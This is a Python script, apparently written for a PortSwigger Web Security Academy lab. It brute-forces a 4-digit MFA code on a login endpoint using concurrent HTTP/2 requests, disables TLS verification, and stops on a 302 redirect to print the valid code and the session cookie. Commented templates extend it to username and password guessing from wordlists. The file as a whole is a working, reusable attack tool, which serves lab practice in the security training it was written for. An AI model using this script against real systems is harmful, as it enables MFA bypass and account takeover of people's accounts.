
# Create venv
# python -m venv /tmp/bf-env
# source /tmp/bf-env/bin/activate

# 2. Install all
# pip install "httpx[h2]"
# pip install "httpx[http2]"

# 3. Execute this script
# python [script].py

# 4. Exit and clear
# deactivate
# rm -rf /tmp/bf-env


import asyncio
import itertools
import re
import httpx

CONCURRENCY_LIMIT = 20

# RAW request (from Burp Intruder) with placeholders like §1§, §2§... or §CODE§, §USER§
RAW_REQUEST = """
POST /login2 HTTP/2
Host: 0af1007904fe18d780313a98005c00a1.web-security-academy.net
Cookie: verify=carlos; session=pXCNlviwuhdDHlQfoLEVgQ76rB0SVXAC
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0af1007904fe18d780313a98005c00a1.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0af1007904fe18d780313a98005c00a1.web-security-academy.net/login2
Accept-Encoding: gzip, deflate, br

mfa-code=§CODE§
""".strip()

# --- PAYLOAD GENERATORS ---

def generate_otps(length=4):
    """Generate zero-padded numbers"""
    for i in range(10**length):
        yield f"{i:0{length}d}"

def generate_wordlist(file_path):
    """Read a wordlist line by line"""
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            yield line.strip()

def generate_payloads():
    """
    Change this function depending on your needs.
    Returns something like this: {"§PLACEHOLDER§": "VALUE"}
    """
    
    # EXAMPLE 1: Single payload (4-digits OTP)
    for otp in generate_otps(length=4):
        yield {"§CODE§": otp}

    # EXAMPLE 2: Multi-payload / Cluster Bomb (Username + Password)
    # usernames = ["admin", "carlos", "wiener"]
    # passwords = generate_wordlist("passwords.txt")
    # for user, pwd in itertools.product(usernames, passwords):
    #     yield {"§USER§": user, "§PASS§": pwd}

    # EXAMPLE 3: Pitchfork (Coupled values 1:1)
    # for user, pwd in zip(users_list, pass_list):
    #     yield {"§USER§": user, "§PASS§": pwd}


# --- PARSER & ENGINE ---

def parse_raw_request(raw_text: str):
    """Build request (url, headers e body) from RAW string."""
    lines = raw_text.splitlines()
    method, path, _ = lines[0].strip().split()
    
    headers = {}
    body_lines = []
    is_body = False
    
    for line in lines[1:]:
        if line == "":
            is_body = True
            continue
        if is_body:
            body_lines.append(line)
        else:
            key, value = line.split(":", 1)
            if key.strip().lower() != "content-length":
                headers[key.strip()] = value.strip()
                
    host = headers.get("Host", "")
    url = f"https://{host}{path}"
    body = "\n".join(body_lines)
    
    return method, url, headers, body

def inject_payloads(raw_template: str, payload_dict: dict) -> str:
    """Sostituisce dinamicamente tutti i segnaposto presenti nel template."""
    result = raw_template
    for placeholder, value in payload_dict.items():
        result = result.replace(placeholder, str(value))
    return result

async def test_code(client, semaphore, method, url, headers, body_template, payload_dict, stop_event):
    if stop_event.is_set():
        return

    async with semaphore:
        # Dynamic body replace
        body = inject_payloads(body_template, payload_dict)
        
        # Dynamic headers replace (ex. Cookie or X-Forwarded-For)
        req_headers = {
            k: inject_payloads(v, payload_dict) for k, v in headers.items()
        }

        try:
            response = await client.request(
                method=method,
                url=url,
                headers=req_headers,
                content=body,
                follow_redirects=False # IMPORTANT if you need to check the return code 302
            )

            # Victory condition
            if response.status_code == 302:
                stop_event.set()
                print(f"\n[+] Valid response (HTTP {response.status_code})!")
                print(f"[+] Valid payload: {payload_dict}")
                print(f"[+] Header Location: {response.headers.get('Location')}")
                print(f"[+] Set-Cookie: {response.headers.get('Set-Cookie')}")
                
        except Exception:
            pass

async def main():
    method, url, headers, body_template = parse_raw_request(RAW_REQUEST)
    
    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    stop_event = asyncio.Event()

    print(f"[*] Inizio fuzzer su {url}...")
    
    limits = httpx.Limits(max_connections=CONCURRENCY_LIMIT, max_keepalive_connections=CONCURRENCY_LIMIT)
    async with httpx.AsyncClient(http2=True, limits=limits, verify=False) as client:
        tasks = []
        
        for payload_dict in generate_payloads():
            tasks.append(
                test_code(client, semaphore, method, url, headers, body_template, payload_dict, stop_event)
            )
            
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())